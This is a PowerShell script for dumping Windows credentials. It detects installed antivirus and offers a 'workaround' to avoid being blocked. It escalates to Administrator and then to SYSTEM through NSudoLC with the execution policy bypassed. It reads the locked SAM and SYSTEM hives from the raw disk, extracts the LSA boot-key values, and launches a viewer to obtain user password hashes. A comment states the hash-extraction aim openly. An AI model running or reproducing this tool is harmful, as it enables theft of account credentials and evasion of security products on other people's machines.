param(
    [switch]$LBO,
    [string]$useWorkaround
)

if ([string]::IsNullOrEmpty($useWorkaround)) {
    # Not specified
    $useWorkaroundValue = $null
}
else {
    $useWorkaroundValue = [bool]::Parse($useWorkaround)
}

$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
if ($useWorkaroundValue -eq $null) {

    $hasThirdPartyAV = [bool]($av | Where-Object {
        $_.displayName -notmatch '^(Microsoft Defender|Windows Defender)$'
    })
    $thirdPartyAV = $av | Where-Object {
         $_.displayName -notmatch 'Microsoft Defender|Windows Defender'
    }
    if ($hasThirdPartyAV) {
        $Red = "`e[31m"
        $Bold = "`e[1m"
        $Reset = "`e[0m"
        $BgRed = "`e[41m"
        $BgBrightWhite = "`e[107m"
        $BrightWhite = "`e[97m"
        Write-Host "$BgBrightWhite$BrightRed THIRD-PARTY ANTIVIRUS DETECTED $Reset"
        Write-Host "The AntiVirus $BgRed$BrightWhite$Bold$($thirdPartyAV.displayName)$Reset is Installed, it will most likely block the execution of this script"
        $answer = Read-Host "Do you want to try using a Workaroung? (Y/N)"
    
        if ($answer -match '^[Yy]$') {
            Write-Host "will try to use workaroung..."
            $useWorkaround = $true
            $useWorkaroundValue = $true
        }
        elseif ($answer -match '^[Nn]$') {
            Write-Host "will NOT try to use workaround. Most likely going to fail"
            $useWorkaround = $false
            $useWorkaroundValue = $false
        }
        else {
            Write-Host "Please enter Y or N."
        }
    }
}
# Get current identity
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
$isSystem = $currentIdentity.Name -eq "NT AUTHORITY\SYSTEM"
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$scriptPath = $MyInvocation.MyCommand.Path
$workingDir = Split-Path $scriptPath
$nsudoPath = Join-Path $workingDir "NSudoLC.exe"

# Relaunch as Administrator if needed
if (-not $isAdmin) {
    $arguments = @(
        '-NoExit',
        '-ExecutionPolicy', 'Bypass',
        '-File', "`"$scriptPath`""
    )

    if ($LBO) {
        $arguments += '-LBO'
    }

    $arguments += "-useWorkaround $($useWorkaroundValue.ToString())"

    Start-Process powershell.exe `
        -Verb RunAs `
        -WorkingDirectory $workingDir `
        -ArgumentList $arguments

    exit
}

# Relaunch as SYSTEM via NSudoLC, set working dir first with -SetDirectory
if (-not $isSystem) {
    $arguments = "Set-Location '$workingDir'; & '$scriptPath'"

    if ($LBO) {
        $arguments += ' -LBO'
    }

    $arguments += "-useWorkaround $($useWorkaroundValue.ToString())"

    & $nsudoPath -U:S -P:E powershell.exe `
        -NoExit `
        -ExecutionPolicy Bypass `
        -Command $arguments

    exit
}


if ($useWorkaroundValue) {
    $typeDef = @'
using System;
using System.Runtime.InteropServices;

public static class RawDiskNative
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        IntPtr lpInBuffer,
        uint nInBufferSize,
        IntPtr lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetFilePointerEx(
        IntPtr hFile,
        long liDistanceToMove,
        out long lpNewFilePointer,
        uint dwMoveMethod);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool GetDiskFreeSpace(
        string lpRootPathName,
        out uint lpSectorsPerCluster,
        out uint lpBytesPerSector,
        out uint lpNumberOfFreeClusters,
        out uint lpTotalNumberOfClusters);

    public const uint GENERIC_READ        = 0x80000000;
    public const uint FILE_SHARE_READ     = 0x1;
    public const uint FILE_SHARE_WRITE    = 0x2;
    public const uint FILE_SHARE_DELETE   = 0x4;
    public const uint OPEN_EXISTING       = 3;
    public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    public const uint FSCTL_GET_RETRIEVAL_POINTERS = 0x00090073;
    public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
}
'@

if (-not ("RawDiskNative" -as [type])) {
    Add-Type -TypeDefinition $typeDef -Language CSharp
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-ClusterSize {
    param([Parameter(Mandatory)][string]$RootPath)  # e.g. "C:\"

    $spc = 0; $bps = 0; $free = 0; $total = 0
    $ok = [RawDiskNative]::GetDiskFreeSpace($RootPath, [ref]$spc, [ref]$bps, [ref]$free, [ref]$total)
    if (-not $ok) {
        throw "GetDiskFreeSpace failed for '$RootPath' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }
    return [uint64]$spc * [uint64]$bps
}

<#
.SYNOPSIS
    Returns the NTFS cluster run list (extents) for a file, including the
    computed byte offset on disk for each run.
#>
function Get-FileDiskOffset {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Path
    )

    if (-not (Test-IsAdmin)) {
        throw "This function requires an elevated (Administrator) PowerShell session."
    }

    $full = (Resolve-Path -LiteralPath $Path).ProviderPath
    $driveRoot = [System.IO.Path]::GetPathRoot($full)   # e.g. "C:\"
    $volumeDev = "\\.\$($driveRoot.TrimEnd('\'))"        # e.g. "\\.\C:"

    $clusterSize = Get-ClusterSize -RootPath $driveRoot

    # Open the file for METADATA ONLY (0 = no read/write data access).
    # This succeeds even if another process has the file open exclusively.
    $hFile = [RawDiskNative]::CreateFile(
        $full,
        0,
        [RawDiskNative]::FILE_SHARE_READ -bor [RawDiskNative]::FILE_SHARE_WRITE -bor [RawDiskNative]::FILE_SHARE_DELETE,
        [IntPtr]::Zero,
        [RawDiskNative]::OPEN_EXISTING,
        [RawDiskNative]::FILE_ATTRIBUTE_NORMAL,
        [IntPtr]::Zero
    )

    if ($hFile -eq [RawDiskNative]::INVALID_HANDLE_VALUE) {
        throw "CreateFile failed for '$full' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    try {
        # Input buffer: STARTING_VCN_INPUT_BUFFER = single LARGE_INTEGER (8 bytes), start at VCN 0
        $inBuf = [Runtime.InteropServices.Marshal]::AllocHGlobal(8)
        [Runtime.InteropServices.Marshal]::WriteInt64($inBuf, 0, 0)

        # Output buffer: RETRIEVAL_POINTERS_BUFFER, sized generously for many extents
        $outSize = 64KB
        $outBuf = [Runtime.InteropServices.Marshal]::AllocHGlobal([int]$outSize)

        try {
            [uint32]$bytesReturned = 0
            $ok = [RawDiskNative]::DeviceIoControl(
                $hFile,
                [RawDiskNative]::FSCTL_GET_RETRIEVAL_POINTERS,
                $inBuf, 8,
                $outBuf, $outSize,
                [ref]$bytesReturned,
                [IntPtr]::Zero
            )

            if (-not $ok) {
                $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($err -eq 38) {
                    # ERROR_HANDLE_EOF -> file is resident (no clusters allocated) or empty
                    Write-Warning "No extents returned - file may be tiny/resident (stored inline in the MFT) or empty."
                    return @()
                }
                throw "DeviceIoControl(FSCTL_GET_RETRIEVAL_POINTERS) failed (Win32 error $err)"
            }

            # Parse RETRIEVAL_POINTERS_BUFFER manually (variable-length struct):
            #   offset 0  : DWORD ExtentCount
            #   offset 8  : LARGE_INTEGER StartingVcn
            #   offset 16 : { LARGE_INTEGER NextVcn; LARGE_INTEGER Lcn; } Extents[ExtentCount]
            $extentCount = [Runtime.InteropServices.Marshal]::ReadInt32($outBuf, 0)
            $startingVcn = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, 8)

            $results = New-Object System.Collections.Generic.List[psobject]
            $prevVcn = $startingVcn
            $recordOffset = 16

            for ($i = 0; $i -lt $extentCount; $i++) {
                $nextVcn = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, $recordOffset)
                $lcn     = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, $recordOffset + 8)
                $recordOffset += 16

                $runClusters = $nextVcn - $prevVcn
                $isSparse = ($lcn -eq -1)

                $results.Add([pscustomobject]@{
                    ExtentIndex   = $i
                    StartVcn      = $prevVcn
                    EndVcn        = $nextVcn
                    ClusterCount  = $runClusters
                    Lcn           = $lcn
                    IsSparseHole  = $isSparse
                    ByteOffset    = if ($isSparse) { $null } else { [uint64]$lcn * $clusterSize }
                    ByteLength    = $runClusters * $clusterSize
                    ClusterSize   = $clusterSize
                    Volume        = $volumeDev
                })

                $prevVcn = $nextVcn
            }

            return $results
        }
        finally {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($inBuf)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($outBuf)
        }
    }
    finally {
        [RawDiskNative]::CloseHandle($hFile) | Out-Null
    }
}

<#
.SYNOPSIS
    Reads a file's raw bytes directly from the volume (bypassing the
    filesystem's data-access locking) and writes them to -OutFile.
#>
function Read-RawFileBytes {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Path,

        [Parameter(Mandatory, Position = 1)]
        [string]$OutFile
    )

    if (-not (Test-IsAdmin)) {
        throw "This function requires an elevated (Administrator) PowerShell session."
    }

    $full = (Resolve-Path -LiteralPath $Path).ProviderPath
    $driveRoot = [System.IO.Path]::GetPathRoot($full)
    $volumeDev = "\\.\$($driveRoot.TrimEnd('\'))"

    # File's logical size - used to trim the final (padded) cluster.
    # This is read via normal metadata (works on locked files too).
    $fileInfo = Get-Item -LiteralPath $full -Force
    $logicalSize = [uint64]$fileInfo.Length

    $extents = Get-FileDiskOffset -Path $full
    if (-not $extents -or $extents.Count -eq 0) {
        throw "No extents found for '$full' - it may be resident (tiny) or empty. Nothing to read from the cluster heap."
    }

    # Open the raw volume for reading.
    $hVol = [RawDiskNative]::CreateFile(
        $volumeDev,
        [RawDiskNative]::GENERIC_READ,
        [RawDiskNative]::FILE_SHARE_READ -bor [RawDiskNative]::FILE_SHARE_WRITE,
        [IntPtr]::Zero,
        [RawDiskNative]::OPEN_EXISTING,
        0,
        [IntPtr]::Zero
    )

    if ($hVol -eq [RawDiskNative]::INVALID_HANDLE_VALUE) {
        throw "CreateFile failed for volume '$volumeDev' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())). Are you elevated?"
    }

    try {
        $outStream = [System.IO.File]::Open($OutFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        try {
            $totalWritten = [uint64]0

            foreach ($ext in $extents) {
                $remainingNeeded = $logicalSize - $totalWritten
                if ($remainingNeeded -le 0) { break }

                $toReadForThisExtent = [Math]::Min([uint64]$ext.ByteLength, $remainingNeeded)

                if ($ext.IsSparseHole) {
                    # Sparse hole -> write zero bytes, no disk read needed
                    $zeroBuf = New-Object byte[] ([int]$toReadForThisExtent)
                    $outStream.Write($zeroBuf, 0, $zeroBuf.Length)
                    $totalWritten += $toReadForThisExtent
                    continue
                }

                [long]$newPos = 0
                $seekOk = [RawDiskNative]::SetFilePointerEx($hVol, [int64]$ext.ByteOffset, [ref]$newPos, 0) # FILE_BEGIN
                if (-not $seekOk) {
                    throw "SetFilePointerEx failed at offset $($ext.ByteOffset) (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
                }

                # Read in chunks to keep buffers reasonable
                $chunkSize = 4MB
                $remainingInExtent = [uint64]$toReadForThisExtent

                while ($remainingInExtent -gt 0) {
                    $thisChunk = [Math]::Min([uint64]$chunkSize, $remainingInExtent)
                    $buf = New-Object byte[] ([int]$thisChunk)
                    [uint32]$bytesRead = 0

                    $readOk = [RawDiskNative]::ReadFile($hVol, $buf, [uint32]$thisChunk, [ref]$bytesRead, [IntPtr]::Zero)
                    if (-not $readOk) {
                        throw "ReadFile on volume failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
                    }
                    if ($bytesRead -eq 0) { break }

                    $outStream.Write($buf, 0, $bytesRead)
                    $totalWritten += $bytesRead
                    $remainingInExtent -= $bytesRead
                }
            }

            Write-Verbose "Wrote $totalWritten of $logicalSize expected bytes to '$OutFile'."
            if ($totalWritten -ne $logicalSize) {
                Write-Warning "Reconstructed size ($totalWritten) does not match logical file size ($logicalSize) - file may use compression/encryption, or extents were incomplete."
            }
        }
        finally {
            $outStream.Dispose()
        }
    }
    finally {
        [RawDiskNative]::CloseHandle($hVol) | Out-Null
    }

    Get-Item -LiteralPath $OutFile
}



# ---------------------------------------------------------------------------
# Example usage (commented out):
# ---------------------------------------------------------------------------
# Get-FileDiskOffset -Path 'C:\path\to\file.ext' | Format-Table -AutoSize
# Read-RawFileBytes  -Path 'C:\path\to\locked-file.ext' -OutFile 'C:\temp\recovered.ext' -Verbose
# Read-RawFileBytes  -Path 'C:\Windows\System32\config\SAM' -OutFile 'C:\Users\test\SAMdump' -Verbose -> to extract SAM file and possibly parse it later to extract user password hashes using https://github.com/Endermanch/scripts or https://github.com/303entity303/Windows-Password-Extractor
}
# Running as SYSTEM here
Write-Host "Running as SYSTEM"
Write-Host "User: $(whoami)"
Write-Host ""

# Your code here

Write-Host ""
Write-Host "Script finished."
Write-Host "PowerShell will stay open."

Write-Host ""
Write-Host "Script finished. PowerShell will stay open."
$sig = @'
using System;
using System.Text;
using System.Runtime.InteropServices;
public class RegClass {
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)]
    public static extern int RegQueryInfoKey(
        IntPtr hKey, StringBuilder lpClass, ref int lpcClass,
        IntPtr lpReserved, out int subkeys, out int subkeyMaxLen,
        out int classMaxLen, out int values, out int valueMaxLen,
        out int secDescLen, out int lastWriteTimeLow, out int lastWriteTimeHigh
    );
}
'@
Add-Type -TypeDefinition $sig

function Get-RegClass($hive, $path) {
    $k = $hive.OpenSubKey($path)
    if (-not $k) { throw "Cannot open $path - run as SYSTEM?" }
    $hPtr = $k.Handle.DangerousGetHandle()
    $class = New-Object System.Text.StringBuilder 256
    $classLen = 256
    $s=$sm=$cm=$v=$vm=$sd=$lwl=$lwh=0
    $ret = [RegClass]::RegQueryInfoKey($hPtr, $class, [ref]$classLen, [IntPtr]::Zero,
        [ref]$s,[ref]$sm,[ref]$cm,[ref]$v,[ref]$vm,[ref]$sd,[ref]$lwl,[ref]$lwh)
    if ($ret -ne 0) { throw "RegQueryInfoKey failed: 0x{0:X}" -f $ret }
    $k.Close()
    return $class.ToString()
}

$hive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
    [Microsoft.Win32.RegistryHive]::LocalMachine,
    [Microsoft.Win32.RegistryView]::Registry64
)
Write-Host "Extracting 4 Values Keys"
$JD    = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\JD"
$GBG   = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\GBG"
$DATA  = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\DATA"
$SKEW1 = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\Skew1"
set-content C:\test.txt -Value "jd=$JD gbg=$GBG data=$DATA skew1=$SKEW1"
$hive.Close()
mkdir reg_Workaround_bypass_hives
Write-Host "JD=$JD GBG=$GBG DATA=$DATA SKEW1=$SKEW1"
$extract_arguments = "--jd $JD --skew1 $SKEW1 --gbg $GBG --data $DATA"
if (-not $useWorkaroundValue) {
    reg export HKEY_LOCAL_MACHINE\SAM test1.reg /y
    $extract_arguments += " --reg test1.reg"
}
if ($LBO) {
    $extract_arguments += " --LBO"
}
if ($useWorkaroundValue) {
    Write-Host "Extracting SAM..."
    Read-RawFileBytes -Path C:\Windows\System32\config\SAM -OutFile $workingDir/reg_Workaround_bypass_hives/SAM
    Write-Host "Extracting SYSTEM..."
    Read-RawFileBytes -Path C:\Windows\System32\config\SYSTEM -OutFile $workingDir/reg_Workaround_bypass_hives/SYSTEM
    Write-Host "Done"
    $extract_arguments += " --hive $workingDir/reg_Workaround_bypass_hives"
}
Write-Host $extract_arguments
Start-Process -FilePath "cmd.exe" -ArgumentList "/k `".\samviewer\samviewer.exe` $extract_arguments"
